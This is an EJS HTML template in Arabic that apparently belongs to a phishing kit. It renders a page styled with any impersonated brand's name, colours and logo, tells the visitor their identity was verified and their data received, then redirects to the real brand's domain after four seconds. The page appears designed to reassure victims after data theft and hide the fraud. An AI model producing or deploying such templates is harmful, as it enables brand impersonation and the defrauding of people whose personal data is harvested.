<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تم بنجاح — <%= tpl.name %></title>
<style>
:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:var(--card);border-radius:16px;padding:40px 32px;max-width:420px;width:100%;text-align:center;box-shadow:0 8px 32px #00000040}
.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:24px;display:block}
.check{width:72px;height:72px;background:#22c55e20;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px}
h1{font-size:1.3rem;margin-bottom:10px;color:#4ade80}
.sub{font-size:.9rem;opacity:.6;line-height:1.7;margin-bottom:28px}
.info-box{background:#22c55e10;border:1px solid #22c55e30;border-radius:12px;padding:14px 18px;font-size:.86rem;margin-bottom:20px;color:#86efac}
.redirect{font-size:.78rem;opacity:.4;margin-top:20px}
</style>
<script>setTimeout(()=>window.location.href='https://<%= tpl.name.toLowerCase().replace(/\s+/g,'').replace(/[^a-z0-9]/g,'') %>.com',4000)</script>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
  <div class="check">✅</div>
  <h1>تمت العملية بنجاح!</h1>
  <p class="sub"><%= pageContent?.subheadline || 'تم التحقق من هويتك بنجاح. شكراً لتعاونك.' %></p>

  <div class="info-box">
    ✓ تم استلام بياناتك وهي قيد المراجعة
  </div>

  <p class="redirect">سيتم تحويلك تلقائياً خلال ثوانٍ...</p>
</div>
</body>
</html>
